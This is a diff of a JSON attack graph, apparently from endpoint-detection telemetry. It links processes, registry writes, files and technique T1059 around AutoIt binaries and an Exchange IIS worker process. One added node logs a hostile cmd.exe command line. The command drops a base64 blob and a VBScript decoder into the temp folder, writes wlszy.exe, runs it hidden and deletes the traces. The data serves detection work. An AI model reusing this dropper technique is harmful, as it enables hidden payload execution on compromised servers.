-        "image_hash": "MD5=0ADB9B817F1DF7807576C2D7068DD931,SHA256=98E4F904F7DE1644E519D09371B8AFCBBF40FF3BD56D76CE4DF48479A4AB884B,IMPHASH=07F236B4003A1F1174171E18CAD3B475",
-        "command_hash": "a7d9c3b1783afa81195fc10177defd0a498584eb6710932c0e7639c4269d206a",
-        "parent_process_id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{6CA7D817-C999-654B-1223-000000000A03}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "autoit v3 script",
-        "name": "autoit v3 script"
-      }
-    },
-    {
-      "id": "Technique:T1059",
-      "label": "T1059",
-      "type": "technique",
-      "group": "Technique",
-      "properties": {
-        "id": "Technique:T1059",
-        "name": "T1059",
-        "display_name": "T1059",
-        "type": "Technique",
-        "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "Registry:3b99716a85bdcfc7380a166eaa14dc6da3d66a820bdb0c9869950053b76b1893:13",
-      "label": "WLSZY.exe",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\APPCOMPATFLAGS\\COMPATIBILITY ASSISTANT\\STORE\\C:\\WINDOWS\\TEMP",
-        "value_name": "WLSZY.exe",
-        "value_data": "Binary Data",
-        "source_image_path": "%system32%\\svchost.exe",
-        "parent_process_id": "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
-        "event_id": "13",
-        "id": "Registry:3b99716a85bdcfc7380a166eaa14dc6da3d66a820bdb0c9869950053b76b1893:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "WLSZY.exe",
-        "name": "WLSZY.exe"
-      }
-    },
-    {
-      "id": "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
-      "label": "w3wp.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{0BBB6F36-3E6E-6378-D612-000000009902}",
-        "pid": "18312",
-        "image_path": "%system32%\\inetsrv\\w3wp.exe",
-        "command_line": "%system32%\\inetsrv\\w3wp.exe -ap \"msexchangepowershellapppool\" -v \"v4.0\" -c \"%programfiles%\\microsoft\\exchange server\\v15\\bin\\genericapppoolconfigwithgcserverenabledfalse.config\" -a \\pipe\\iisipm256cfd27-a9a7-47bb-8a5b-085d96a1edfe -h \"c:\\inetpub\\temp\\apppools\\msexchangepowershellapppool\\msexchangepowershellapppool.config\" -w  -m 0",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "w3wp.exe",
-        "name": "w3wp.exe"
-      }
-    },
-    {
-      "id": "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{0BBB6F36-3642-6378-1200-000000009902}",
-        "pid": "764",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:2",
-      "label": "autoit3.exe",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
-        "source_image_path": "%programfiles%\\7-zip\\7zg.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{6CA7D817-C96E-654B-0523-000000000A03}:1",
-        "event_id": "2",
-        "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:2",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "autoit3.exe",
-        "name": "autoit3.exe"
+        "display_name": "BinProductVersion",
+        "name": "BinProductVersion"
       }
     },
     {
@@ -578,6 +354,30 @@
       }
     },
     {
+      "id": "Process:{6CA7D817-C990-654B-0B23-000000000A03}:1",
+      "label": "autoit v3 script",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "autoit v3 script",
+        "guid": "{6CA7D817-C990-654B-0B23-000000000A03}",
+        "pid": "6424",
+        "image_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "command_line": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "original_file_name": "autoit3.exe",
+        "image_hash": "MD5=0ADB9B817F1DF7807576C2D7068DD931,SHA256=98E4F904F7DE1644E519D09371B8AFCBBF40FF3BD56D76CE4DF48479A4AB884B,IMPHASH=07F236B4003A1F1174171E18CAD3B475",
+        "command_hash": "3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d",
+        "parent_process_id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{6CA7D817-C990-654B-0B23-000000000A03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "autoit v3 script",
+        "name": "autoit v3 script"
+      }
+    },
+    {
       "id": "Registry:8a2794b75d151512963bfa7d8c63a60245f9cfae9ffc6d182d036a4212e5ed03:13",
       "label": "AutoIt3.exe",
       "type": "registry",
@@ -594,25 +394,6 @@
         "entity_class": "RegistryEntity",
         "display_name": "AutoIt3.exe",
         "name": "AutoIt3.exe"
-      }
-    },
-    {
-      "id": "Registry:5a34b517650592974e04eb28b608bc6486c6f5b05e3b67d02a1d5ad76bdf5b30:13",
-      "label": "LinkDate",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
-        "value_name": "LinkDate",
-        "value_data": "09/19/2022 18:34:17",
-        "source_image_path": "%system32%\\svchost.exe",
-        "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
-        "event_id": "13",
-        "id": "Registry:5a34b517650592974e04eb28b608bc6486c6f5b05e3b67d02a1d5ad76bdf5b30:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "LinkDate",
-        "name": "LinkDate"
       }
     },
     {
@@ -638,6 +419,347 @@
         "display_name": "7zg.exe",
         "name": "7zg.exe"
       }
+    },
+    {
+      "id": "Process:{6CA7D817-C993-654B-0C23-000000000A03}:1",
+      "label": "autoit v3 script",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "autoit v3 script",
+        "guid": "{6CA7D817-C993-654B-0C23-000000000A03}",
+        "pid": "6592",
+        "image_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "command_line": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe\" -h",
+        "original_file_name": "autoit3.exe",
+        "image_hash": "MD5=0ADB9B817F1DF7807576C2D7068DD931,SHA256=98E4F904F7DE1644E519D09371B8AFCBBF40FF3BD56D76CE4DF48479A4AB884B,IMPHASH=07F236B4003A1F1174171E18CAD3B475",
+        "command_hash": "b7458d948f5ebe4d4a78b25b45d7c26f5530f802523ab6ccdaa1d21fc807d9b0",
+        "parent_process_id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{6CA7D817-C993-654B-0C23-000000000A03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "autoit v3 script",
+        "name": "autoit v3 script"
+      }
+    },
+    {
+      "id": "Process:{E265CAAD-CEE7-60AD-B5C4-00000000C501}:1",
+      "label": "-",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "-",
+        "guid": "{E265CAAD-CEE7-60AD-B5C4-00000000C501}",
+        "pid": "2532",
+        "image_path": "%windir%\\xsljvqla.exe",
+        "command_line": "%windir%\\xsljvqla.exe",
+        "original_file_name": "-",
+        "image_hash": "MD5=6983F7001DE10F4D19FC2D794C3EB534,SHA256=3C2FE308C0A563E06263BBACF793BBE9B2259D795FCC36B953793A7E499E7F71,IMPHASH=4749670AC3D28D6761142B0DCB4F5076",
+        "command_hash": "1207b7d4fa1eca2494c6fdcbdba859d76035e268fd00f0c0ab9d6138c75ec488",
+        "parent_process_id": "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{E265CAAD-CEE7-60AD-B5C4-00000000C501}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "-",
+        "name": "-"
+      }
+    },
+    {
+      "id": "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
+      "label": "w3wp.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{0BBB6F36-3E6E-6378-D612-000000009902}",
+        "pid": "18312",
+        "image_path": "%system32%\\inetsrv\\w3wp.exe",
+        "command_line": "%system32%\\inetsrv\\w3wp.exe -ap \"msexchangepowershellapppool\" -v \"v4.0\" -c \"%programfiles%\\microsoft\\exchange server\\v15\\bin\\genericapppoolconfigwithgcserverenabledfalse.config\" -a \\pipe\\iisipm256cfd27-a9a7-47bb-8a5b-085d96a1edfe -h \"c:\\inetpub\\temp\\apppools\\msexchangepowershellapppool\\msexchangepowershellapppool.config\" -w  -m 0",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "w3wp.exe",
+        "name": "w3wp.exe"
+      }
+    },
+    {
+      "id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
+      "label": "powershell.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{6CA7D817-C983-654B-0923-000000000A03}",
+        "pid": "4556",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe"
+      }
+    },
+    {
+      "id": "Process:{6CA7D817-C999-654B-1223-000000000A03}:1",
+      "label": "autoit v3 script",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "autoit v3 script",
+        "guid": "{6CA7D817-C999-654B-1223-000000000A03}",
+        "pid": "6884",
+        "image_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "command_line": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe\" help",
+        "original_file_name": "autoit3.exe",
+        "image_hash": "MD5=0ADB9B817F1DF7807576C2D7068DD931,SHA256=98E4F904F7DE1644E519D09371B8AFCBBF40FF3BD56D76CE4DF48479A4AB884B,IMPHASH=07F236B4003A1F1174171E18CAD3B475",
+        "command_hash": "a7d9c3b1783afa81195fc10177defd0a498584eb6710932c0e7639c4269d206a",
+        "parent_process_id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{6CA7D817-C999-654B-1223-000000000A03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "autoit v3 script",
+        "name": "autoit v3 script"
+      }
+    },
+    {
+      "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:2",
+      "label": "autoit3.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "source_image_path": "%programfiles%\\7-zip\\7zg.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{6CA7D817-C96E-654B-0523-000000000A03}:1",
+        "event_id": "2",
+        "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:2",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "autoit3.exe",
+        "name": "autoit3.exe"
+      }
+    },
+    {
+      "id": "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{0BBB6F36-3642-6378-1200-000000009902}",
+        "pid": "764",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Technique:T1059",
+      "label": "T1059",
+      "type": "technique",
+      "group": "Technique",
+      "properties": {
+        "id": "Technique:T1059",
+        "name": "T1059",
+        "display_name": "T1059",
+        "type": "Technique",
+        "entity_class": "Technique"
+      }
+    },
+    {
+      "id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{6CA7D817-67D3-654A-1300-000000000A03}",
+        "pid": "1004",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe"
+      }
+    },
+    {
+      "id": "Registry:154c2ac5a04a09ed204fff6ef689b8033d38b05415fa3655a024c15d9af039cf:13",
+      "label": "Publisher",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
+        "value_name": "Publisher",
+        "value_data": "autoit team",
+        "source_image_path": "%system32%\\svchost.exe",
+        "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
+        "event_id": "13",
+        "id": "Registry:154c2ac5a04a09ed204fff6ef689b8033d38b05415fa3655a024c15d9af039cf:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "Publisher",
+        "name": "Publisher"
+      }
+    },
+    {
+      "id": "Registry:5a34b517650592974e04eb28b608bc6486c6f5b05e3b67d02a1d5ad76bdf5b30:13",
+      "label": "LinkDate",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
+        "value_name": "LinkDate",
+        "value_data": "09/19/2022 18:34:17",
+        "source_image_path": "%system32%\\svchost.exe",
+        "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
+        "event_id": "13",
+        "id": "Registry:5a34b517650592974e04eb28b608bc6486c6f5b05e3b67d02a1d5ad76bdf5b30:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "LinkDate",
+        "name": "LinkDate"
+      }
+    },
+    {
+      "id": "Registry:3b99716a85bdcfc7380a166eaa14dc6da3d66a820bdb0c9869950053b76b1893:13",
+      "label": "WLSZY.exe",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "HKU\\%SID%\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\APPCOMPATFLAGS\\COMPATIBILITY ASSISTANT\\STORE\\C:\\WINDOWS\\TEMP",
+        "value_name": "WLSZY.exe",
+        "value_data": "Binary Data",
+        "source_image_path": "%system32%\\svchost.exe",
+        "parent_process_id": "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
+        "event_id": "13",
+        "id": "Registry:3b99716a85bdcfc7380a166eaa14dc6da3d66a820bdb0c9869950053b76b1893:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "WLSZY.exe",
+        "name": "WLSZY.exe"
+      }
+    },
+    {
+      "id": "File:4b2667fbbb71ee4e3a0f803d132679453426588f6694a2384547c0313f02a750:11",
+      "label": "autoit3.exe",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%temp%\\2\\autoit-v3\\install\\autoit3.exe",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{6CA7D817-CF8B-654B-D523-000000000A03}:1",
+        "event_id": "11",
+        "id": "File:4b2667fbbb71ee4e3a0f803d132679453426588f6694a2384547c0313f02a750:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "autoit3.exe",
+        "name": "autoit3.exe"
+      }
+    },
+    {
+      "id": "Registry:8e8e092444a34a72f73f651c17795232fd413826b175170a1b09e0dbfc404aac:13",
+      "label": "LowerCaseLongPath",
+      "type": "registry",
+      "group": "Registry",
+      "properties": {
+        "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
+        "value_name": "LowerCaseLongPath",
+        "value_data": "c:\\users\\administrator\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "source_image_path": "%system32%\\svchost.exe",
+        "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
+        "event_id": "13",
+        "id": "Registry:8e8e092444a34a72f73f651c17795232fd413826b175170a1b09e0dbfc404aac:13",
+        "type": "Registry",
+        "entity_class": "RegistryEntity",
+        "display_name": "LowerCaseLongPath",
+        "name": "LowerCaseLongPath"
+      }
+    },
+    {
+      "id": "Process:{0BBB6F36-7E64-637B-666B-010000009902}:1",
+      "label": "cmd.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows command processor",
+        "guid": "{0BBB6F36-7E64-637B-666B-010000009902}",
+        "pid": "19192",
+        "image_path": "%system32%\\cmd.exe",
+        "command_line": "%system32%\\cmd.exe\" \\c echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatkixmaaaaaa2gmfkaqaaaem6xgxvy2fsmfxhc2zccmvszwfzzvxidwlszc0yljiumtrcc3vwcg9ydfxszwxlyxnlxgfilnbkyga=>>%temp%\\ofpmf.b64 & echo set fs = createobject(\"scripting.filesystemobject\") >>%temp%\\osyge.vbs & echo set file = fs.getfile(\"%temp%\\ofpmf.b64\") >>%temp%\\osyge.vbs & echo if file.size then >>%temp%\\osyge.vbs & echo set fd = fs.opentextfile(\"%temp%\\ofpmf.b64\", 1) >>%temp%\\osyge.vbs & echo data = fd.readall >>%temp%\\osyge.vbs & echo data = replace(data, vbcrlf, ) >>%temp%\\osyge.vbs & echo data = base64_decode(data) >>%temp%\\osyge.vbs & echo fd.close >>%temp%\\osyge.vbs & echo set ofs = createobject(\"scripting.filesystemobject\").opentextfile(\"%temp%\\wlszy.exe\", 2, true) >>%temp%\\osyge.vbs & echo ofs.write data >>%temp%\\osyge.vbs & echo ofs.close >>%temp%\\osyge.vbs & echo set shell = createobject(\"wscript.shell\") >>%temp%\\osyge.vbs & echo shell.run \"%temp%\\wlszy.exe\", 0, false >>%temp%\\osyge.vbs & echo else >>%temp%\\osyge.vbs & echo wscript.echo \"the file is empty.\" >>%temp%\\osyge.vbs & echo end if >>%temp%\\osyge.vbs & echo function base64_decode(byval strin) >>%temp%\\osyge.vbs & echo dim w1, w2, w3, w4, n, strout >>%temp%\\osyge.vbs & echo for n = 1 to len(strin) step 4 >>%temp%\\osyge.vbs & echo w1 = mimedecode(mid(strin, n, 1)) >>%temp%\\osyge.vbs & echo w2 = mimedecode(mid(strin, n + 1, 1)) >>%temp%\\osyge.vbs & echo w3 = mimedecode(mid(strin, n + 2, 1)) >>%temp%\\osyge.vbs & echo w4 = mimedecode(mid(strin, n + 3, 1)) >>%temp%\\osyge.vbs & echo if not w2 then _ >>%temp%\\osyge.vbs & echo strout = strout + chr(((w1 * 4 + int(w2 \\ 16)) and 255)) >>%temp%\\osyge.vbs & echo if not w3 then _ >>%temp%\\osyge.vbs & echo strout = strout + chr(((w2 * 16 + int(w3 \\ 4)) and 255)) >>%temp%\\osyge.vbs & echo if not w4 then _ >>%temp%\\osyge.vbs & echo strout = strout + chr(((w3 * 64 + w4) and 255)) >>%temp%\\osyge.vbs & echo next >>%temp%\\osyge.vbs & echo base64_decode = strout >>%temp%\\osyge.vbs & echo end function >>%temp%\\osyge.vbs & echo function mimedecode(byval strin) >>%temp%\\osyge.vbs & echo base64chars = \"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789+\\\" >>%temp%\\osyge.vbs & echo if len(strin) = 0 then >>%temp%\\osyge.vbs & echo mimedecode = -1 : exit function >>%temp%\\osyge.vbs & echo else >>%temp%\\osyge.vbs & echo mimedecode = instr(base64chars, strin) - 1 >>%temp%\\osyge.vbs & echo end if >>%temp%\\osyge.vbs & echo end function >>%temp%\\osyge.vbs & cscript \\nologo %temp%\\osyge.vbs & del %temp%\\osyge.vbs & del %temp%\\ofpmf.b64",
+        "original_file_name": "cmd.exe",
+        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
+        "command_hash": "598cc6cc24c670e37bb694c54dc4a08a248411f256a39195832266085152ad9f",
+        "event_id": "1",
+        "id": "Process:{0BBB6F36-7E64-637B-666B-010000009902}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "cmd.exe",
+        "name": "cmd.exe",
+        "parent_process_id": "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
+      "label": "services.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{E265CAAD-7839-60A7-0A00-00000000C501}",
+        "pid": "532",
+        "image_path": "%system32%\\services.exe",
+        "command_line": "%system32%\\services.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "services.exe",
+        "name": "services.exe"
+      }
     }
   ],
   "edges": [
@@ -652,7 +774,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:45:37.364829+00:00"
+        "timestamp": "2026-05-08T20:10:55.414256+00:00"
       }
     },
     {
@@ -666,7 +788,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:45:37.364829+00:00"
+        "timestamp": "2026-05-08T20:10:55.414256+00:00"
       }
     },
     {
@@ -680,7 +802,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:45:37.364829+00:00"
+        "timestamp": "2026-05-08T20:10:55.414256+00:00"
       }
     },
     {
@@ -694,7 +816,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.416800+00:00"
       }
     },
     {
@@ -708,7 +830,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.416800+00:00"
       }
     },
     {
@@ -722,7 +844,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.416800+00:00"
       }
     },
     {
@@ -736,7 +858,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.416800+00:00"
       }
     },
     {
@@ -750,7 +872,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.416800+00:00"
       }
     },
     {
@@ -764,7 +886,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.416800+00:00"
       }
     },
     {
@@ -778,7 +900,7 @@
       "properties": {
         "action": "File Creation Time Changed",
         "event_id": "2",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.418817+00:00"
       }
     },
     {
@@ -792,7 +914,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.418817+00:00"
       }
     },
     {
@@ -806,7 +928,7 @@
       "properties": {
         "action": "Registry Value Set",
         "event_id": "13",
-        "timestamp": "2026-05-08T17:45:37.380660+00:00"
+        "timestamp": "2026-05-08T20:10:55.424856+00:00"
       }
     },
     {
@@ -820,7 +942,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:45:37.397155+00:00"
+        "timestamp": "2026-05-08T20:10:55.434655+00:00"
       }
     },
     {
@@ -834,7 +956,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:45:37.427984+00:00"
+        "timestamp": "2026-05-08T20:10:55.514490+00:00"
       }
     },
     {
@@ -848,7 +970,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T17:45:37.668604+00:00"
+        "timestamp": "2026-05-08T20:10:55.816905+00:00"
       }
     },
     {
@@ -957,7 +1079,7 @@
     "attack_edges": 22,
     "roots": 7,
     "matched_malicious_nodes": 15,
-    "core_effect_nodes": 11,
+    "core_effect_nodes": 123,
     "matched_whitelist_nodes": 74,
     "matched_overlap_whitelist_override_nodes": 1
   }
